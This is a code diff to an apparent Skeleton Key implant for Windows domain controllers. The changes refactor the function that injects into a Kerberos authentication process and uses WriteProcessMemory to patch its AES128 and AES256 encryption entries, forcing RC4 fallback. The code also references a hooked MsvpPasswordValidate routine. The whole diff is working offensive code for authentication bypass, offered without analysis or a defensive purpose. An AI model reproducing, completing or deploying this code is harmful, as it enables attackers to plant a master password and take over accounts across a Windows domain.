@@ -11,12 +11,6 @@
 
 wchar_t cryptdll[] = L"cryptdll.dll", msv1_0[] = L"msv1_0.dll";
 
-typedef BOOL(WINAPI* PMSVPPASSWORDVALIDATE)(LPSTR unk1, DWORD unk2, PVOID NTstruct, PLM_OWF_PASSWORD pRealPassword, PDWORD unk3, PUCHAR unk4, PVOID unk5);
-typedef NTSTATUS(WINAPI* PCDLOCATECSYSTEM)(ULONG Type, PKERB_ECRYPT* ppCSystem);
-typedef PVOID(__cdecl* PMEMCPY) (__out_bcount_full_opt(_MaxCount) void* _Dst, __in_bcount_opt(_MaxCount) const void* _Src, __in size_t _MaxCount);
-typedef HLOCAL(WINAPI* PLOCALALLOC) (__in UINT uFlags, __in SIZE_T uBytes);
-typedef HLOCAL(WINAPI* PLOCALFREE) (__deref HLOCAL hMem);
-
 
 #pragma optimize("", off)
 BOOL WINAPI Skel_MsvpPasswordValidate(LPSTR unk1, NETLOGON_LOGON_INFO_CLASS unk2, PVOID NTstruct, PNT_OWF_PASSWORD pRealPassword, PDWORD unk3, PUCHAR unk4, PVOID unk5)
@@ -148,9 +142,14 @@ BOOL Skel_InstallOnKerbAuth(DWORD processID, HANDLE hProcess)
 		{
 			if ((NT_SUCCESS(CDLocateCSystem(0x11, &pCrypt_aes128))) && (NT_SUCCESS(CDLocateCSystem(0x12, &pCrypt_aes256))))
 			{
-				PRINT_SUCCESS(L"Patching packages : AES128 : 0x%-016p <--> 0x%-016p : AES256\n", pCrypt_aes128, pCrypt_aes256);
-				aesPackagesDisabled = WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes128 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL);
-				aesPackagesDisabled = WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes256 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL);
+				PRINT_SUCCESS(L"Packages : AES128 : 0x%-016p <--> 0x%-016p : AES256\n", pCrypt_aes128, pCrypt_aes256);
+				if (
+					WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes128 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL) &&
+					WriteProcessMemory(hProcess, (LPVOID)((PBYTE)pCrypt_aes256 + FIELD_OFFSET(KERB_ECRYPT, EncryptionType)), patch, sizeof(ULONG), NULL)
+					)
+				{
+					aesPackagesDisabled = TRUE;
+				}
 			}
 			else
 				PRINT_ERROR(L"AES packages not found.\n");
@@ -159,7 +158,7 @@ BOOL Skel_InstallOnKerbAuth(DWORD processID, HANDLE hProcess)
 			
 	if (aesPackagesDisabled)
 	{
-		PRINT_SUCCESS(L"AES packages successfully disabled. RC4 fallback expected.\n");
+		PRINT_SUCCESS(L"AES packages patched. Fallback to RC4 expected.\n");
 		if (NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
 		{
 			PRINT_SUCCESS(L"KERB_ETYPE_RC4_HMAC_NT located: 0x%-016p\n", pCrypt);
